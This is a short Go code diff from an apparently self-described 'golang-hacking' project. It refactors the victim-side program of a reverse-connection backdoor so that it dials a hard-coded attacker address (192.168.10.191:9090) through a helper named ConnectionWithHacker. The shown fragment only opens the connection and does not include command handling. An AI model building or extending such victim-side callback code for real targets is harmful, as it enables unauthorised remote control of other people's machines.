@@ -2,20 +2,19 @@ package main
 
 import (
 	"fmt"
+	"golang-hacking/VictimFinalVersion/core/handleConnection"
 	"log"
-	"net"
 )
 
 func main() {
 	ServerIP := "192.168.10.191"
 	Port := "9090"
-	ServerAddress := ServerIP + ":" + Port
-
-	connection, err := net.Dial("tcp", ServerAddress)
+	connection, err := handleConnection.ConnectionWithHacker(ServerIP, Port)
 	if err != nil {
-		fmt.Println("Connection couldnt be established with tthe server")
 		log.Fatal(err)
 	}
 
-	fmt.Println("[+] Connection established with: ", connection.RemoteAddr().String())
+	defer connection.Close()
+	fmt.Println("[+] Connection established with Server :", connection.RemoteAddr().String())
+
 }
